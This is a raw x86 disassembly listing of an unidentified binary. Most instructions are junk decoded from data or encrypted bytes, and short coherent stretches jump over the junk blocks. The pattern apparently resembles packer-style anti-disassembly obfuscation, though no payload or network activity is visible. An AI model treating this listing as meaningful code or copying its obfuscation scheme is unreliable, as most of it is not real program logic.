  40e997:	add    eax,0x6d594cdd
  40e99d:	out    dx,eax
  40e99e:	mov    BYTE PTR [edi-0x3],al
  40e9a1:	xchg   ebp,eax
  40e9a2:	mov    esp,0xb920751d
  40e9a7:	xchg   BYTE PTR [edi],al
  40e9a9:	xor    BYTE PTR [ecx],bl
  40e9ab:	gs test ecx,esp
  40e9ae:	cli    
  40e9af:	sub    edi,esp
  40e9b1:	push   0x21
  40e9b3:	sub    al,0x60
  40e9b5:	xor    ah,0xe9
  40e9b8:	lahf   
  40e9b9:	push   esi
  40e9ba:	retf   
  40e9bb:	jbe    0x40e99f
  40e9bd:	inc    ebx
  40e9be:	popf   
  40e9bf:	call   edi
  40e9c1:	xor    ch,0xeb
  40e9c4:	cld    
  40e9c5:	add    al,0xc1
  40e9c7:	pop    ds
  40e9c8:	dec    edx
  40e9c9:	sub    dl,dl
  40e9cb:	es stos DWORD PTR es:[edi],eax
  40e9cd:	loope  0x40e9e4
  40e9cf:	jmp    0x5b4f5c8
  40e9d4:	(bad)  
  40e9d5:	es sbb al,0x1f
  40e9d8:	push   es
  40e9d9:	pop    ds
  40e9da:	fsub   DWORD PTR [esi]
  40e9dc:	push   cs
  40e9dd:	retf   0xd4a2
  40e9e0:	mov    bh,0x5
  40e9e2:	in     al,0xc6
  40e9e4:	and    eax,0x7a72b643
  40e9e9:	adc    ch,BYTE PTR [esi]
  40e9eb:	cmc    
  40e9ec:	adc    dh,BYTE PTR [ebp-0x5c9afaeb]
  40e9f2:	dec    eax
  40e9f3:	mov    bh,0xfe
  40e9f5:	cli    
  40e9f6:	fadd   QWORD PTR [edx-0x4b]
  40e9f9:	retf   0xc5de
  40e9fc:	loopne 0x40e9cf
  40e9fe:	sbb    ebp,DWORD PTR [edx+eax*2-0xe]
  40ea02:	das    
  40ea03:	call   0x84d4fb41
  40ea08:	enter  0x5ead,0x92
  40ea0c:	in     al,dx
  40ea0d:	enter  0xcfd,0xbf
  40ea11:	push   ecx
  40ea12:	jnp    0x40e9ae
  40ea14:	cmp    DWORD PTR [edx+0xe81caa7],ecx
  40ea1a:	push   edx
  40ea1b:	shl    BYTE PTR [ebx-0x4fc90691],cl
  40ea21:	inc    edx
  40ea22:	outs   dx,BYTE PTR ds:[esi]
  40ea23:	pop    es
  40ea24:	mov    ?,WORD PTR [eax+0x44]
  40ea27:	mov    edi,0xd209152
  40ea2c:	and    ebp,ecx
  40ea2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea2f:	ret    
  40ea30:	test   BYTE PTR [edi-0x5f],bl
  40ea33:	rcl    BYTE PTR [ebp-0x78],cl
  40ea36:	ret    
  40ea37:	lock xor al,0x84
  40ea3a:	mov    edx,0x2393e3be
  40ea3f:	pop    ds
  40ea40:	jle    0x40ea5c
  40ea42:	push   edx
  40ea43:	dec    esp
  40ea44:	xchg   ebx,eax
  40ea45:	adc    al,0x1c
  40ea47:	mov    bh,0x10
  40ea49:	sbb    DWORD PTR [eax],esp
  40ea4b:	out    0xf5,eax
  40ea4d:	inc    esi
  40ea4e:	inc    BYTE PTR [ebx+0x21]
  40ea51:	inc    ebp
  40ea52:	pop    ss
  40ea53:	int    0xf0
  40ea55:	repnz fmul QWORD PTR [ebx]
  40ea58:	iret   
  40ea59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5a:	arpl   WORD PTR [edi],sp
  40ea5c:	mov    dh,0x3e
  40ea5e:	ficom  WORD PTR [ebx]
  40ea60:	aaa    
  40ea61:	mov    ds:0x7f2ad06e,eax
  40ea66:	and    cl,dh
  40ea68:	push   ebx
  40ea69:	push   ds
  40ea6a:	cld    
  40ea6b:	inc    ebx
  40ea6c:	loope  0x40ea93
  40ea6e:	pop    ebx
  40ea6f:	aam    0xb7
  40ea71:	sar    ch,cl
  40ea73:	jae    0x40ea94
  40ea75:	mov    bh,0xb8
  40ea77:	pop    edx
  40ea78:	jno    0x40ea47
  40ea7a:	jbe    0x40ea77
  40ea7c:	pop    edx
  40ea7d:	xlat   BYTE PTR ds:[ebx]
  40ea7e:	inc    ecx
  40ea7f:	(bad)  
  40ea80:	adc    ch,BYTE PTR [ebp+ecx*8-0x71]
  40ea84:	cmp    eax,0x44029ca2
  40ea89:	out    0x95,al
  40ea8b:	mov    dh,BYTE PTR ds:0x465ac733
  40ea91:	fild   DWORD PTR [edx-0x4f]
  40ea94:	push   es
  40ea95:	fxch   st(1)
  40ea97:	lahf   
  40ea98:	mul    BYTE PTR [ecx]
  40ea9a:	aad    0x9d
  40ea9c:	outs   dx,BYTE PTR ds:[esi]
  40ea9d:	iret   
  40ea9e:	pop    ecx
  40ea9f:	inc    esi
  40eaa0:	push   ecx
  40eaa1:	sahf   
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fc65
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e0a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e0a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e0a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e0b0
  40eafd:	push   0x42e0ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e28f
  40eb15:	cmp    DWORD PTR ds:0x42e0a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e0a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e0a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e0a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e0a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xe6
  40eb8d:	push   ds
  40eb8e:	ret    0xf760
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ebd6
  40eb99:	lea    esi,[edx+edx*2-0x7a]
  40eb9d:	mov    ds,ebp
  40eb9f:	stos   DWORD PTR es:[edi],eax
  40eba0:	in     al,0xd1
  40eba2:	in     eax,0x70
  40eba4:	sub    DWORD PTR [ebx],edx
  40eba6:	dec    edi
  40eba7:	sbb    DWORD PTR [ebp-0x6b],eax
  40ebaa:	pop    ebp
  40ebac:	repnz das 
  40ebae:	pushf  
  40ebaf:	mov    al,0xd
  40ebb1:	arpl   sp,bp
  40ebb3:	pop    edi
  40ebb4:	xchg   ecx,eax
  40ebb5:	fst    DWORD PTR [edx]
  40ebb7:	adc    eax,0xd243b340
  40ebbc:	pop    edi
  40ebbd:	or     ebp,DWORD PTR [eax+0x1a1917ef]
  40ebc3:	or     edx,edi
  40ebc5:	icebp  
  40ebc6:	dec    ebx
  40ebc7:	mov    ss,WORD PTR [edi]
  40ebc9:	mov    ah,0xb2
  40ebcc:	inc    edi
  40ebcd:	(bad)  
  40ebce:	mov    ss,WORD PTR fs:[ecx+0x4a]
  40ebd2:	mov    WORD PTR [ecx],gs
  40ebd4:	lock scas eax,DWORD PTR es:[edi]
  40ebd6:	shr    bl,1
  40ebd8:	out    0x90,eax
  40ebda:	mov    cl,0x46
  40ebdc:	sbb    al,0x7d
  40ebde:	jmp    0x40ec45
  40ebe0:	fs (bad) 
  40ebe2:	(bad)  
  40ebe3:	pop    ds
  40ebe4:	iret   
  40ebe5:	pop    ss
  40ebe6:	inc    edx
  40ebe7:	sub    DWORD PTR [ecx+0x18d50d3a],ebx
  40ebed:	pop    ecx
  40ebee:	and    eax,0xa56ef713
  40ebf3:	sbb    BYTE PTR [ecx],dh
  40ebf5:	inc    edi
  40ebf6:	sti    
  40ebf7:	mov    WORD PTR [eax+0x6aacf816],ds
  40ebfd:	cli    
  40ebfe:	adc    edx,DWORD PTR [esi]
  40ec00:	daa    
  40ec01:	add    al,0xf9
  40ec03:	and    DWORD PTR [edi],esi
  40ec05:	repnz rol DWORD PTR [esi-0x28030b58],1
  40ec0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec0d:	push   ebx
  40ec0e:	outs   dx,BYTE PTR ds:[esi]
  40ec0f:	lds    ebp,FWORD PTR [edi+0x21]
  40ec12:	test   eax,0xdbab1c5d
  40ec17:	scas   al,BYTE PTR es:[edi]
  40ec18:	icebp  
  40ec19:	inc    esp
  40ec1a:	ret    0xa859
  40ec1d:	mov    ch,0x24
  40ec1f:	lahf   
  40ec20:	(bad)  
  40ec22:	cli    
  40ec23:	pop    esi
  40ec24:	outs   dx,DWORD PTR ds:[esi]
  40ec25:	sar    ch,cl
  40ec27:	pop    esp
  40ec28:	aam    0xc4
  40ec2a:	inc    edi
  40ec2b:	enter  0xb951,0x34
  40ec2f:	fld    DWORD PTR [ecx-0x405edc31]
  40ec35:	xor    bl,dl
  40ec37:	rcl    DWORD PTR [edi+0x6c0b3e25],1
  40ec3d:	arpl   WORD PTR [edi+0x75],sp
  40ec40:	inc    ecx
  40ec41:	mov    ebp,0x8af31e50
  40ec46:	add    BYTE PTR ds:0xe345646,ch
  40ec4c:	or     eax,0x77bd0958
  40ec51:	stos   BYTE PTR es:[edi],al
  40ec52:	neg    BYTE PTR [edx]
  40ec54:	mov    bh,0x51
  40ec56:	xchg   edi,eax
  40ec57:	pusha  
  40ec58:	loopne 0x40ec7c
  40ec5a:	cmp    DWORD PTR [ecx+0x77],edi
  40ec5d:	pusha  
  40ec5e:	dec    ebp
  40ec5f:	dec    DWORD PTR [edx+0x2d879597]
  40ec65:	add    esp,DWORD PTR [esi+ebp*2]
  40ec68:	adc    eax,0xb2133cd0
  40ec6d:	dec    ebx
  40ec6e:	pop    eax
  40ec6f:	xor    BYTE PTR gs:[bx+0x4],bl
  40ec74:	fild   QWORD PTR [ebp-0x1d]
  40ec77:	jbe    0x40ec7e
  40ec79:	imul   ebp,DWORD PTR [ecx-0x374104ca],0xffffffbf
  40ec80:	adc    DWORD PTR [ecx-0x3a8884c4],eax
  40ec86:	cmp    DWORD PTR [ecx+eax*4-0x39],ebp
  40ec8a:	and    BYTE PTR [edi+0x6],0xaa
  40ec8e:	sar    DWORD PTR [ecx-0x73],0x93
  40ec92:	mov    bl,0x9c
  40ec94:	jno    0x40eccf
  40ec96:	lods   eax,DWORD PTR ds:[esi]
  40ec97:	lea    eax,ds:0x7d6b90ea
  40ec9d:	inc    edx
  40ec9e:	dec    ebx
  40ec9f:	mov    eax,ds:0x3a599aa
  40eca4:	push   ds
  40eca5:	mov    esi,0x27b77c4e
  40ecaa:	add    al,0x9a
  40ecac:	fcmovnb st,st(7)
  40ecae:	adc    dl,BYTE PTR [edx]
  40ecb0:	(bad)  
  40ecb1:	sbb    BYTE PTR [ecx+ebx*4-0x67],dl
  40ecb5:	sub    BYTE PTR [esi-0x79],dl
  40ecb8:	dec    eax
  40ecb9:	push   ecx
  40ecba:	mov    cl,0x8d
  40ecbc:	repnz es pop ss
  40ecbf:	mov    ch,0x5d
  40ecc1:	cmp    DWORD PTR [ebp+0x263f9d62],esi
  40ecc7:	sub    dh,ch
  40ecc9:	add    edx,ebp
  40eccb:	rsqrtps xmm7,XMMWORD PTR [esi+0x76]
  40eccf:	or     ebp,ebx
  40ecd1:	xor    edx,DWORD PTR [edx+0xb6e956e]
  40ecd7:	add    BYTE PTR [ecx-0x6b],dh
  40ecda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecdc:	retf   0xdd2b
  40ecdf:	ret    
  40ece0:	jp     0x40ed29
  40ece2:	or     BYTE PTR [edi-0x4d],al
  40ece5:	cmp    eax,ecx
  40ece7:	mov    eax,DWORD PTR [ebp-0x14]
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed13
  40ed00:	ss leave 
  40ed02:	sar    DWORD PTR [edx-0x3c8f8f52],0x7f
  40ed09:	jo     0x40ed7b
  40ed0b:	sbb    BYTE PTR [eax+edx*1+0x6a],ch
  40ed0f:	pop    edx
  40ed10:	popf   
  40ed11:	add    eax,0x32e77438
  40ed16:	je     0x40ecd8
  40ed18:	sbb    al,0xaa
  40ed1a:	mov    ebx,0xbbe239a0
  40ed1f:	ja     0x40ed18
  40ed21:	rcr    DWORD PTR [esi-0x10cb015a],cl
  40ed27:	xor    dl,BYTE PTR [edi+0x132e7965]
  40ed2d:	push   ds
  40ed2e:	mov    ecx,0x40435eb3
  40ed33:	ss daa 
  40ed35:	sub    eax,0xb28e41d8
  40ed3a:	ins    BYTE PTR es:[edi],dx
  40ed3b:	test   eax,0xf197695f
  40ed40:	addr16 inc edx
  40ed42:	fild   WORD PTR [ebp+0x1]
  40ed45:	inc    ebx
  40ed46:	push   edx
  40ed47:	sahf   
  40ed48:	and    eax,0xf0c9b0bd
  40ed4d:	fdiv   st(7),st
  40ed4f:	xchg   DWORD PTR [edx],ebp
  40ed51:	(bad)  [ebp-0x4e555d40]
  40ed57:	mov    esi,0xc4dd85e5
  40ed5c:	(bad)  
  40ed5d:	popf   
  40ed5e:	enter  0xc24a,0x94
  40ed62:	jge    0x40ed82
  40ed64:	sti    
  40ed65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed66:	aaa    
  40ed67:	int3   
  40ed68:	pop    ss
  40ed69:	popa   
  40ed6a:	mov    cl,0x9c
  40ed6c:	xchg   esp,eax
  40ed6d:	mov    DWORD PTR [ebx-0x70d6cc81],ecx
  40ed73:	shl    BYTE PTR [esi],0x2e
  40ed76:	dec    ebx
  40ed77:	cmp    eax,esp
  40ed79:	add    bl,BYTE PTR [ebp-0x68ed963a]
  40ed7f:	jne    0x40ed88
  40ed81:	lahf   
  40ed82:	test   DWORD PTR [eax+0x7fb72f76],edx
  40ed88:	fsubr  st,st(1)
  40ed8a:	loop   0x40edd4
  40ed8c:	push   edx
  40ed8d:	les    esi,FWORD PTR [ecx+0x4c]
  40ed90:	push   edi
  40ed91:	push   ss
  40ed92:	jmp    0xae4a:0xb64cfe44
  40ed99:	cdq    
  40ed9a:	adc    al,BYTE PTR [ebp-0x4dc37f2e]
  40eda0:	jne    0x40ed37
  40eda2:	adc    al,0x4a
  40eda4:	ss push esi
  40eda6:	pop    edi
  40eda7:	ins    DWORD PTR es:[edi],dx
  40eda8:	out    dx,eax
  40eda9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edaa:	imul   edi,DWORD PTR [eax-0x7c3e08ca],0xffffffdf
  40edb1:	aam    0x67
  40edb3:	fldcw  WORD PTR [eax]
  40edb5:	(bad)  
  40edb6:	and    BYTE PTR [esi-0x126c155c],dl
  40edbc:	xor    cl,BYTE PTR ds:0x47eb7042
  40edc2:	inc    esi
  40edc3:	jl     0x40ed58
  40edc5:	mov    bl,0xb8
  40edc7:	lock xchg ebp,eax
  40edc9:	bound  ebx,QWORD PTR [ebp-0x63e61811]
  40edcf:	gs (bad) 
  40edd1:	dec    esi
  40edd2:	imul   dh
  40edd4:	push   0x39
  40edd6:	inc    ebp
  40edd7:	mov    ?,WORD PTR [eax-0x634d33b2]
  40eddd:	mov    al,0xc5
  40eddf:	xchg   edi,eax
  40ede0:	jo     0x40ed84
  40ede2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ede3:	push   ebp
  40ede4:	es push ebp
  40ede6:	fwait
  40ede7:	aam    0xb7
  40ede9:	cwde   
  40edea:	inc    esp
  40edeb:	fldcw  WORD PTR [edi+ebp*4]
  40edee:	xchg   esi,eax
  40edef:	js     0x40ee1d
  40edf1:	outs   dx,BYTE PTR ds:[esi]
  40edf2:	stc    
  40edf3:	outs   dx,BYTE PTR ds:[esi]
  40edf4:	xchg   esi,eax
  40edf5:	mov    ah,0xad
  40edf7:	stos   DWORD PTR es:[edi],eax
  40edf8:	mov    esi,0xff087cd6
  40edfd:	pop    ss
  40edfe:	add    al,0x84
  40ee00:	test   eax,0xe646110a
  40ee05:	cmp    BYTE PTR [edx],0xa9
  40ee08:	adc    al,0x4c
  40ee0a:	xchg   edx,eax
  40ee0b:	xchg   esi,eax
  40ee0c:	cwde   
  40ee0d:	(bad)  
  40ee0f:	pop    ss
  40ee10:	int3   
  40ee11:	retf   
  40ee12:	inc    eax
  40ee13:	add    ah,dh
  40ee15:	fisubr DWORD PTR ds:0xaebddba4
  40ee1b:	(bad)  
  40ee1c:	push   esi
  40ee1d:	add    al,0xd6
  40ee1f:	jae    0x40ede8
  40ee21:	(bad)  
  40ee22:	icebp  
  40ee23:	ds sbb al,0x5f
  40ee26:	push   0xffffffb3
  40ee28:	in     eax,0x90
  40ee2a:	adc    eax,0xdbe0bd76
  40ee2f:	daa    
  40ee30:	dec    edx
  40ee31:	dec    eax
  40ee32:	adc    DWORD PTR [edi-0x65ce5e74],0xdb7091e4
  40ee3c:	or     ebx,ecx
  40ee3e:	ins    BYTE PTR es:[edi],dx
  40ee3f:	jle    0x40ee36
  40ee41:	fidivr WORD PTR [edx-0x2a]
  40ee44:	push   cs
  40ee45:	les    ebx,FWORD PTR [edx]
  40ee47:	xchg   edi,eax
  40ee48:	rol    dh,cl
  40ee4a:	fcmovnb st,st(7)
  40ee4c:	mov    bh,0x68
  40ee4e:	mov    dh,0x72
  40ee50:	adc    edi,DWORD PTR [ecx+0x4e612888]
  40ee56:	mov    ds:0x798f0f44,eax
  40ee5b:	add    DWORD PTR [eax],eax
  40ee5d:	add    BYTE PTR [ebx],dh
  40ee5f:	(bad)  
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x9
  40ee7f:	in     al,dx
  40ee80:	jge    0x40eed3
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40eecc
  40ee8b:	repnz sub BYTE PTR [ebp-0x66f1572b],bh
  40ee92:	push   ss
  40ee93:	xor    eax,0xd8478899
  40ee98:	mov    esp,0x6dd759f8
  40ee9d:	dec    edx
  40ee9e:	mov    bl,0x93
  40eea0:	xchg   edx,eax
  40eea1:	loopne 0x40ee5b
  40eea3:	xlat   BYTE PTR ds:[ebx]
  40eea4:	retf   
  40eea5:	aam    0x92
  40eea7:	sbb    edx,DWORD PTR [eax+0x41dbe519]
  40eead:	(bad)  
  40eeaf:	or     eax,0x4557faea
  40eeb4:	stc    
  40eeb5:	mov    ah,0xa
  40eeb7:	ins    DWORD PTR es:[edi],dx
  40eeb8:	popa   
  40eeb9:	in     eax,dx
  40eeba:	aaa    
  40eebb:	retf   0x36cf
  40eebe:	lahf   
  40eebf:	xor    eax,0x5c59dde1
  40eec4:	jb     0x40eeb3
  40eec6:	pop    ss
  40eec7:	sbb    DWORD PTR [ebp+ecx*8+0x58],edx
  40eecb:	scas   al,BYTE PTR es:[edi]
  40eecc:	daa    
  40eecd:	(bad)  
  40eece:	add    BYTE PTR [ebx+ebp*4+0x37bc90cb],0xf8
  40eed6:	ja     0x40ee6f
  40eed8:	or     DWORD PTR [edi-0x49],0x46
  40eedc:	push   esi
  40eedd:	daa    
  40eede:	outs   dx,BYTE PTR ds:[esi]
  40eedf:	cdq    
  40eee0:	popf   
  40eee1:	loopne 0x40ef5f
  40eee3:	jmp    0x40ee87
  40eee5:	sbb    ch,0xde
  40eee8:	(bad)  
  40eee9:	inc    esi
  40eeea:	sub    al,0xcd
  40eeec:	mov    dh,0x4f
  40eeee:	jp     0x40ef34
  40eef0:	pop    ebx
  40eef1:	data16 mov ch,0x72
  40eef4:	call   DWORD PTR [esi+ebp*8+0x56]
  40eef8:	ja     0x40ef4f
  40eefa:	aas    
  40eefb:	jae    0x40ef34
  40eefd:	jnp    0x40ef38
  40eeff:	ja     0x40eef6
  40ef01:	push   ebp
  40ef02:	outs   dx,BYTE PTR ds:[esi]
  40ef03:	mov    ?,WORD PTR [edi]
  40ef05:	lahf   
  40ef06:	jmp    FWORD PTR [edi]
  40ef08:	xor    DWORD PTR [esi-0xc7d24a4],edx
  40ef0e:	vmwrite esi,DWORD PTR [eax+0x75]
  40ef12:	fwait
  40ef13:	sbb    dl,BYTE PTR [edx]
  40ef15:	jg     0x40eecb
  40ef17:	mov    edi,0x9fe90189
  40ef1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef1d:	imul   ebx,DWORD PTR [esp+edx*8-0x117daf68],0x8567be41
  40ef28:	(bad)  
  40ef29:	imul   ebp,esp,0xc22fc56b
  40ef2f:	push   0x2fd94141
  40ef34:	lods   al,BYTE PTR ds:[esi]
  40ef35:	cwde   
  40ef36:	xchg   edi,eax
  40ef37:	enter  0x443b,0x6a
  40ef3b:	ret    0x2d49
  40ef3e:	(bad)  
  40ef40:	fcmovnu st,st(0)
  40ef42:	aaa    
  40ef43:	hlt    
  40ef44:	sbb    al,0x10
  40ef46:	or     ah,BYTE PTR [edi-0xe]
  40ef49:	add    ah,BYTE PTR [ebx]
  40ef4b:	bound  ecx,QWORD PTR [ebp+0x1c197baf]
  40ef51:	pop    ecx
  40ef52:	mov    esi,0x39d1cb41
  40ef57:	add    DWORD PTR [edi-0x7c7885af],esp
  40ef5d:	es push cs
  40ef5f:	fistp  WORD PTR [eax]
  40ef61:	lahf   
  40ef62:	fadd   QWORD PTR [edi+ebp*4+0x637a1989]
  40ef69:	dec    ecx
  40ef6a:	and    ecx,DWORD PTR [ebp-0x6f]
  40ef6d:	adc    BYTE PTR [ebp+0xbf7567f],cl
  40ef73:	sbb    cl,BYTE PTR [ebx]
  40ef75:	mov    ch,0xe6
  40ef77:	repz xchg edx,eax
  40ef79:	fxch   st(1)
  40ef7b:	jg     0x40ef96
  40ef7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef7e:	leave  
  40ef7f:	push   ebp
  40ef80:	repz retf 0xc7dd
  40ef84:	outs   dx,BYTE PTR ds:[esi]
  40ef85:	fs xchg ebx,eax
  40ef87:	inc    ecx
  40ef88:	cdq    
  40ef89:	ret    
  40ef8a:	test   eax,eax
  40ef8c:	add    BYTE PTR [eax-0x9bd823],dl
  40ef92:	pop    es
  40ef93:	push   esp
  40ef94:	das    
  40ef95:	inc    eax
  40ef96:	pop    ecx
  40ef97:	mov    bh,0x82
  40ef99:	xlat   BYTE PTR ds:[ebx]
  40ef9a:	or     esp,DWORD PTR [edx+ebp*4+0x4f]
  40ef9e:	int3   
  40ef9f:	test   eax,0x78e2e53c
  40efa4:	push   es
  40efa5:	int3   
  40efa6:	push   esi
  40efa7:	cs (bad) 
  40efa9:	mov    ebx,0x7a33750
  40efae:	inc    esp
  40efaf:	adc    eax,0x5994e1e2
  40efb4:	mov    al,ds:0xf3b20826
  40efb9:	pop    edx
  40efba:	bound  esi,QWORD PTR [edi]
  40efbc:	stc    
  40efbd:	in     al,0x7d
  40efbf:	stos   DWORD PTR es:[edi],eax
  40efc0:	xor    dl,ah
  40efc2:	mov    edi,0x30a0bdc3
  40efc7:	stos   BYTE PTR es:[edi],al
  40efc8:	(bad)  
  40efc9:	aad    0x56
  40efcb:	inc    esi
  40efcc:	adc    ebp,DWORD PTR [ecx]
  40efce:	pop    esp
  40efcf:	push   edx
  40efd0:	mov    dl,0x41
  40efd2:	stos   DWORD PTR es:[edi],eax
  40efd3:	outs   dx,BYTE PTR ds:[esi]
  40efd4:	lahf   
  40efd5:	(bad)  
  40efd6:	xor    dh,BYTE PTR [ebx]
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	mov    al,0xe1
  40effc:	js     0x40efa2
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	or     esi,0x59676bd9
  40f00c:	pusha  
  40f00d:	mov    bh,0x75
  40f00f:	sar    DWORD PTR [ecx+0x15],1
  40f012:	add    eax,0x852a31f5
  40f017:	pop    eax
  40f018:	inc    ebx
  40f019:	sub    BYTE PTR [eax],dh
  40f01b:	mov    al,ds:0x5a65cb67
  40f020:	cmp    eax,0xb364a8a9
  40f025:	(bad)  
  40f026:	sbb    BYTE PTR [ebx+0x15],al
  40f029:	dec    cx
  40f02b:	sub    ebx,DWORD PTR [ebp-0x5]
  40f02e:	retf   
  40f02f:	stos   BYTE PTR es:[edi],al
  40f030:	mov    esi,0x73eeaa88
  40f035:	mov    WORD PTR [eax+0x51],fs
  40f038:	cmp    eax,0x520ec68e
  40f03d:	(bad)  
  40f03e:	mov    eax,ds:0xa75b5058
  40f043:	lahf   
  40f044:	imul   eax,esp,0x29
  40f047:	js     0x40f056
  40f049:	jbe    0x40f008
  40f04b:	xor    al,0x19
  40f04d:	sbb    bl,BYTE PTR [ebp+0x1]
  40f050:	gs mov edi,0xf43a1cbe
  40f056:	jns    0x40f0c5
  40f058:	imul   edi,ebp,0x2b87af50
  40f05e:	test   DWORD PTR [edx],0xe0d27ae1
  40f064:	popf   
  40f065:	scas   eax,DWORD PTR es:[edi]
  40f066:	xchg   edx,eax
  40f067:	nop
  40f068:	mov    dl,0x58
  40f06a:	push   esi
  40f06b:	in     eax,0x1d
  40f06d:	or     edx,esi
  40f06f:	pop    ecx
  40f070:	stc    
  40f071:	stc    
  40f072:	mov    esi,0x501ebcf2
  40f077:	inc    ecx
  40f078:	inc    eax
  40f079:	fld    DWORD PTR [edi]
  40f07b:	pop    esi
  40f07c:	mov    ebx,0x6fec1106
  40f081:	pusha  
  40f082:	sub    esi,DWORD PTR [eax]
  40f084:	inc    edi
  40f085:	shr    DWORD PTR [eax],1
  40f087:	dec    eax
  40f088:	xor    al,0xc3
  40f08a:	int    0x60
  40f08c:	sbb    al,0x37
  40f08e:	jecxz  0x40f0ca
  40f090:	lds    ebp,FWORD PTR [esi+0x8dd7501]
  40f096:	xlat   BYTE PTR ds:[ebx]
  40f097:	mov    dl,0xe1
  40f099:	cmp    al,ah
  40f09b:	retf   0xbd9f
  40f09e:	inc    edi
  40f09f:	jo     0x40f0c0
  40f0a1:	push   esi
  40f0a2:	lds    ebp,FWORD PTR [ecx+0x72d0a0ca]
  40f0a8:	loop   0x40f08d
  40f0aa:	scas   eax,DWORD PTR es:[edi]
  40f0ab:	jle    0x40f10c
  40f0ad:	jne    0x40f0f0
  40f0af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0b0:	push   es
  40f0b1:	in     eax,dx
  40f0b2:	nop
  40f0b3:	popa   
  40f0b4:	fs fcmove st,st(1)
  40f0b7:	imul   edx,DWORD PTR [edi+0x50],0xfffffff0
  40f0bb:	mov    BYTE PTR [eax+0x46d9f83],bl
  40f0c1:	lock repz in eax,dx
  40f0c4:	ins    BYTE PTR es:[edi],dx
  40f0c5:	aas    
  40f0c6:	inc    ebx
  40f0c7:	leave  
  40f0c8:	(bad)  
  40f0c9:	fst    QWORD PTR [edi+0x282bee09]
  40f0cf:	xchg   ecx,eax
  40f0d0:	cmp    eax,0x4cfdb62
  40f0d5:	div    BYTE PTR [edx+0x7e]
  40f0d8:	mov    bl,0xa0
  40f0da:	aam    0xf7
